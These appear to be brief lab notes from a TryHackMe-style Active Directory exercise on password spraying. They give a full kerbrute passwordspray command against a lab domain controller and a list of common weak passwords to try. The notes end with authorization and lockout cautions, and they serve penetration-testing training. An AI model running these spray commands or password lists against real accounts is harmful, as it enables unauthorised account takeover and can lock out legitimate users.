# Phase 4: Password Spraying
 

## Objective
Obtain valid credentials by spraying common passwords
against discovered user accounts.

## What is Password Spraying?
Testing one common password against many users to avoid
account lockout — unlike brute force which targets one
account with many passwords.

## Kerbrute Password Spray
```bash
./kerbrute passwordspray \
--dc 10.211.11.10 \
-d tryhackme.loc \
users.txt \
"Password123"
```

## Common Passwords to Try
- Password123
- Welcome1
- Company2024
- Summer2024
- Admin123

## Important Notes
- Check password policy before spraying
- Too many attempts can lock accounts
- Only use in authorized environments
